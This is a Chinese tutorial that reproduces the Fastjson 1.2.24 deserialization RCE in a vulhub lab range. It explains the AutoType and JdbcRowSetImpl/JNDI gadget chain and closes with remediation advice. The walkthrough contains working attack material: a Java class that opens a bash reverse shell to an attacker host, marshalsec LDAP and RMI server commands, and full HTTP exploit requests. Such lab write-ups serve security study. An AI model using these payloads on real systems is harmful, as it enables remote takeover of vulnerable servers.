[TOC]



# ==Fastjson1.2.24-RCE漏洞复现==

教材内容

> ```java
> package com.ymqyyds.vul;
> import com.alibaba.fastjson.JSON;
> import com.alibaba.fastjson.serializer.SerializerFeature;
> 
> public class FastJaon {
>     public static void main(String[] args) {
>         Test T = new Test();
>         String json = JSON.toJSONString(T);
>         System.out.println(json);
> 
>         String jsonautotype = JSON.toJSONString(T, SerializerFeature.WriteClassName);
>         System.out.println(jsonautotype);
>         
>     }
> }
> ```
>
> ![image-20250125132107603](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125132107603.png)
>
> 上述代码的输出如上图所示：
>
> `JSON.toJSONString(T, SerializerFeature.WriteClassName)` 的输出结果会在最前面加上 `"@type":"com.ymqyyds.vul.Test"` 这样一个键值对，表示说明，我要将这段 序列化的值 反序列化成哪个类，目标就是 @type 的值

#### 一、漏洞简介

Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。

阿里巴巴公司开源Java开发组件Fastjson存在反序列化漏洞（CNVD-2022-40233）。攻击者可利用该漏洞实施任意文件写入、服务端请求伪造等攻击行为，造成服务器权限被窃取、敏感信息泄漏等严重影响。

该漏洞影响fastjson 1.2.80及之前所有版本

#### 二、漏洞原理

> 简单概述：
>
> FastJaon由于自己定义了反序列化的机制，并且在请求他的时候我们可以在请求头中带上 @Type 请求字段来指定让他反序列化哪个类
>
> 然后就可以支持我们来利用 lookup() 这个方法来远程调用 LDAP 或 RMI 的轻量级远程目录访问
>
> 之后呢我们可以通过构造恶意java代码（比如反弹shell）并对其进行编译之后，将编译好的 class 文件放到我们的公网服务器
>
> 通过 AutoType 指定，让 FastJson 来反序列化哪个类，并且我们在代码中指定类的属性，进而实现 RCE

##### 1、原理概述

Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。但是，从诞生之初，fastjson就多次被爆出存在反序列化漏洞。这都和autoType有关。

Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链，造成远程代码执行。

##### 2、AutoType

Fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。但是，fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。

对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：

（1）基于属性

（2）基于setter/getter

而我们所常用的JSON序列化框架中，FastJson和jackson在把对象序列化成json字符串的时候，是通过遍历出该类中的所有getter方法进行的。Gson并不是这么做的，他是通过反射遍历该类中的所有属性，并把其值序列化成json。我们对java类进行序列化的时候，fastjson会自动扫描其中的get方法，将里边的字段值序列化到JSON的字符串中，当类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候就会将子类型抹去，只留下接口（抽象类）的类型，反序列化的时候就无法拿到原始的类型。

但是使用SerializerFeature.WriteClassName进行标记后，JSON字符串中多出了一个[@type](https://github.com/type)字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型，这个就是AutoType，和引入AutoType的原因。

例如 ：

```java
package fastjson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
public class fastjson1 {    
    public static void main(String[] args){        
        Student student = new Student();   
        // 实例化任意一个有属性的类即可        
        System.out.println(JSON.toJSONString(student));        
        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));    
    }
}
```

有没有参数SerializerFeature.WriteClassName的结果就是不一样的

![image-20220818142330526](https://gitee.com/ymq_typroa/typroa/raw/main/20220904224953.png)

因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取[@type](https://github.com/type)到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。那么就可以利用这个特性，自己构造一个JSON字符串，并且使用[@type](https://github.com/type)指定一个自己想要使用的攻击类库。

##### 3、JNDI 注入

JNDI全称为Java命名和目录接口。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。

命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。

目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器来进行查找。

对比一下命名服务和目录服务，其实命名服务就是绑定对象，而目录服务就是绑定了对象的属性。在JNDI中，命名服务和目录服务是一起结合提供的，最容易理解的一个例子就是RMI。

在RMI的服务端，通常我们会将一个远程对象和一个名称进行绑定，然后将其注册到注册表里面。除了通过RMI来实现客户端从而获取到对象之外，还可以使用JNDI来获取对象。JNDI其实就是对这些提供了命名服务或者目录服务的逻辑进行了一个封装，例如上面的RMI，我们可以直接调用JNDI提供的lookup函数来远程获取，例如：`lookup("rmi://127.0.0.1/bind")；` 如果提供服务的是LDAP，我们同样可以通过 `lookup("ldap://127.0.0.1/") `来进行访问。

##### 4、JNDI注入和lookup函数

我们可以直接在lookup参数指定URL，例如 `lookup("rmi://127.0.0.1:1099/m1sn0w")`，由于JNDI存在一个动态地址转换协议，也就是说当我们在lookup上指定一个URL的时候，就会优先于Context.PROVIDER_URL的设置进行加载。

至此，就可以想到，如果这个lookup参数可控的话，那么我们就可以传入恶意的url地址来控制受害者加载攻击者指定的恶意类。当我们指定一个恶意的URL地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在RMI中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个class文件，当然也就不能成功获取到这个对象。

##### 5、RMI

RMI（Remote Method Invocation）远程方法调用，是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。

运行了RMI的一端可以被称为“RMIServer”，用来提供可被远程调用的方法，这个过程称为“注册”

reference的功能已经在前面简单的介绍过，做为一个外部远程对象，目的是让客户端来获取RMI Server上的引用对象，指定了codebase也就是远程的地址，以及要获取的factory类名，剩下的就是等客户端来主动请求。

请求的方式是通过http，就需要在192.168.76.133上运行http服务，并把已经编译好的serialize.Exploit.class放到响应的目录供客户端获取。这里就体现了RMI的核心，RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class。

2、运行了looup()方法的一端可以被称为 “RMIClient”，根据RMI请求返回的结果来再次通过http获取所需的factory类并进行实例化

#### 三、JdbcRowSetImpl利用链分析

在fastjson中我们使用 JdbcRowSetImpl进行反序列化的攻击，下面是我们JdbcRowSetImpl利用链分析。

JDBC（Java DataBase Connectivity）就是Java数据库连接，说白了就是用Java语言来操作数据库。原来我们操作数据库是在控制台使用[SQL语句](https://so.csdn.net/so/search?q=SQL语句&spm=1001.2101.3001.7020)来操作数据库，JDBC是用Java语言向数据库发送SQL语句。分析过程如下：

##### 1、找到JdbcRowSetImpl中调用了lookup()方法的函数

可以看到在com.sun.rowset.JdbcRowSetImpl.class中的connect()中调用了lookup()，并且lookup的参数是通过getDataSourceName()方法获取到的，可以看到在实例化JdbcRowSetImpl的时候就会调用到这个lookup函数去getDataSourceName，所以我们就需要确认这个get的结果是我们可控的。

![image-20250125133927725](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125133927725.png)

从java的函数文档可以查到DataSource是通过setDataSourceName来设置的，也就是dataSource属性的set和get方法。

![image-20220818114810895](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225004.png)

所以这里就同时出现了get和set方法

（2）找到调用了lookup方法的函数，下面进行分析那个函数能够触发lookup方法。

（1）prepare()函数

![image-20220818115118750](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225007.png)

![image-20220818115220585](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225009.png)

 这个函数的利用过程是execute()->prepare()->connect()，也就是得执行excute()方法才会执行到connect()，所以这个利用链使用的不是这个函数。

##### 2、getDatabaseMetaData()函数

![image-20220818115339540](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225013.png)

这个地方出现了connect函数，但是并没有set的方法，所以这个也不能成为利用链的一环

##### 3、setAutoCommit()函数

![image-20220818115548094](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225015.png)

 setAutoCommit() 方法就使用了connet()函数，传值就是一个bool值，这个AutoCommit就既有set方法也有get方法。

![image-20220818115656300](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225018.png)

这个set方法很重要，只要能设置autoCommit就能调用set方法，而setAutoCommit()方法里面又调用了connect()，connent()里面就有我们需要的lookup()，从而构造整个的攻击链

##### 4、JdbcRowSetImpl利用

 JdbcRowSetImpl利用链的重点就在怎么调用autoCommit的set方法，而fastjson反序列化的特点就是会自动调用到类的set方法，所以会存在这个反序列化的问题。只要制定了[@type](https://github.com/type)的类型，他就会自动调用对应的类来解析。

 这样我们就可以构造我们的利用链。在[@type](https://github.com/type)的类型为JdbcRowSetImpl类型的时候，JdbcRowSetImpl类就会进行实例化，那么只要将dataSourceName传给lookup方法，就可以保证能够访问到远程的攻击服务器，再使用设置autoCommit属性对lookup进行触发就可以了。整个过程如下：

 通过设置dataSourceName将属性传参给lookup的方法—>设置autoCommit属性，利用SetAutoCommit函数触发connect函数—>触发connect函数下面lookup函数就会使用刚刚设置的dataSourceName参数，即可通过RMI访问到远程服务器，从而执行恶意指令。

exploit如下：

{“[@type](https://github.com/type)”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”rmi://192.168.17.39:9999/Exploit”,”autoCommit”:true}

值得注意的是：

（1）dataSourceName 需要放在autoCommit的前面，因为反序列化的时候是按先后顺序来set属性的，需要先setDataSourceName，然后再setAutoCommit。

（2）rmi的url后面跟上要获取的我们远程factory类名，因为在lookup()里面会提取路径下的名字作为要获取的类。

##### 5、触发过程图

![导图](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225024.png)

#### 四、靶场模拟

##### 1、实验环境

- 被攻击服务器


主机：CentOS7（192.168.17.102）+ Docker：vulhub/fastjson-1.2.24-rce

- 攻击者主机：

kali（192.168.17.39）+ 可以实现反弹的任意机器（也可以是Kali）

- 使用工具：

marshalsec-0.0.3-SNAPSHOT-all.jar ，https://github.com/RandomRobbieBF/marshalsec-jar

##### 2、docker拉取镜像

进入 vulhub-master\fastjson\1.2.24-rce 目录，运行 docker-compose up -d

![image-20220818101509936](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225043.png)

启动环境并访问成功

![image-20220818101611235](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225046.png)

##### 3、检测是否存在漏洞（DNSLog验证）

请求头添加

Content-Type: application/json

请求体为

`{"zeo":{"@type":"java.net.Inet4Address","val":"ymqyyds.us697g.dnslog.cn"}}`

```http
POST / HTTP/1.1
Host: 192.168.17.102:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
DNT: 1
Connection: close

{"zeo":{"@type":"java.net.Inet4Address","val":"ymqyyds.us697g.dnslog.cn"}}
```

可以看到是有回显的，存在漏洞利用的地方。

![image-20250125150033102](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125150033102.png)

![image-20250125150013462](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125150013462.png)

##### 4、漏洞利用

（1）编辑恶意类，以反弹shell为例

注意，构造Java的恶意代码类时，不要将代码放置于任何包中。也就是直接在 java 这个目录下面创建即可

```java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
public class Exploit{    
    public Exploit() throws Exception {        
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/192.168.17.39/6666 0>&1"});        
        InputStream is = p.getInputStream();        
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));        
        String line;        
        while((line = reader.readLine()) != null) {            
            System.out.println(line);        
        }        
        p.waitFor();        
        is.close();        
        reader.close();        
        p.destroy();    
    }    
    public static void main(String[] args) throws Exception {   
        
    }
}
```

编译成Exploit.class

（2）开放http并将Exploit.class 公开在网站上

python3 -m http.server 80

![image-20220818103041300](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225052.png)

（3）起一个LDAP服务器（说白了就是文件下载服务器）监听9999端口，远程加载Exploit类

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.17.39:80/#Exploit 9999
```

![image-20220818104621021](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225055.png)

（4）提交数据包（可以使用Burp或Fiddler）

```http
POST / HTTP/1.1
Host: 192.168.17.102:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflateContent-Type: application/json
DNT: 1
Connection: close

{    
	"b":{        
		"@type":"com.sun.rowset.JdbcRowSetImpl",        
		"dataSourceName":"ldap://192.168.17.39:9999/Exploit",        
		"autoCommit":true    
	}
}
```

可以看到运行过程：

（1）LDAP服务器接收到请求

![image-20220818105247088](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225103.png)

（2）httpserver收到get请求

![image-20220818105257185](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225105.png)

（3）接收到反弹shell

![image-20220818105143623](https://gitee.com/ymq_typroa/typroa/raw/main/20220904225108.png)

至此靶场模拟结束。

> 什么意思呢
>
> - 自己编译一份 class 的文件（注意该文件的存储路径），然后上传至公网服务器，同时，公网服务器中，在上传该文件的目录下使用python开启一个web 服务，为了让受害者服务器可以访问到该目录下的文件，如果有 apache 之类的也可以不用python
>
>   ![image-20250125160217411](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125160217411.png)
>
>   ![image-20250125160252267](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125160252267.png)
>
>   ![image-20250125160300807](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125160300807.png)
>
> - 然后再在公网服务器上开启一个 LDAP 服务（轻量级的目录访问协议），并且该服务监听 9999 端口。目的是让受害者不仅可以访问到该目录下的文件，还可以下载，该服务就是提供了一个文件下载的功能
>
>   ![image-20250125160331376](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125160331376.png)
>
> - 之后，使用 nc 开启监听
>
>   比如 `nc -lvp 6666` 这里的端口和payload代码中的端口一致
>
> - 然后我们再用另一台机器请求受害者服务器并上传 POST 请求的 payload（payload中的代码执行会让受害者服务器向我们的公网服务器请求指定的class文件），让受害者去我们的公网服务器下载 class 文件并进行反序列化，然后来执行我们的指令
>
>   ![image-20250125160703367](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125160703367.png)
>
> - 之后受害者服务器反弹 shell 到我们的公网服务器
>
>   ![image-20250125160740729](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125160740729.png)
>
> 我们的环境就如下图所示;
>
> ![](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250125161324360.png)

##### 5、也可以使用RMI进行调用

> 我们来看一下官方给的 RMI 利用方法
>
> ```java
> // javac TouchFile.java
> import java.lang.Runtime;
> import java.lang.Process;
> 
> public class TouchFile {
>     static {
>         try {
>             Runtime rt = Runtime.getRuntime();
>             String[] commands = {"touch", "/tmp/success"};
>             Process pc = rt.exec(commands);
>             pc.waitFor();
>         } catch (Exception e) {
>             // do nothing
>         }
>     }
> }
> ```
>
> 我们看这里，这里直接在TouchFile类名下面直接开始写代码，并没有放在一个函数里面，按常理来说这样应该会报错，但是这里确实可以正常执行的，甚至连 main 函数都没有，这是为什么，因为 java 里 static 方法里面的代码（静态代码块），在jvm加载这个类的时候代码就会执行

（1）在Kali上启动（使用JDK1.8启动或其它版本应该也可以）

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.17.39:80/#TouchFile 9999
```

（2）调用时换成RMI即可：

```json
{    
    "b":{        
        "@type":"com.sun.rowset.JdbcRowSetImpl",        
        "dataSourceName":"rmi://192.168.17.39:9999/TouchFile",        
        "autoCommit":true    
    }
}
```

效果是一样的。

#### 五、修复方案

曾经有过fastjson多次的官方升级：

```
1.2.59发布，增强AutoType打开时的安全性 
fastjson1.2.60发布，增加了AutoType黑名单，修复拒绝服务安全问题 
fastjson1.2.61发布，增加AutoType安全黑名单 
fastjson1.2.62发布，增加AutoType黑名单、增强日期反序列化和JSONPath 
fastjson1.2.66发布，Bug修复安全加固，并且做安全加固，补充了AutoType黑名单 
fastjson1.2.67发布，Bug修复安全加固，补充了AutoType黑名单 
fastjson1.2.68发布，支持GEOJSON，补充了AutoType黑名单。（引入一个safeMode的配置，配置safeMode后，无论白名单和黑名单，都不支持autoType。） 
fastjson1.2.69发布，修复新发现高危AutoType开关绕过安全漏洞，补充了AutoType黑名单 
fastjson1.2.70发布，提升兼容性，补充了AutoType黑名单
```

修复的方案如下：

方案一：建议升级到最新版本1.2.83。

方案二：safeMode加固。

Fastjson在1.2.68及之后的版本中引入了safeMode，配置safeMode后，无论白名单和黑名单，都不支持 autoType，可杜绝反序列化Gadgets类变种攻击。

方案三：升级至Fastjson v2。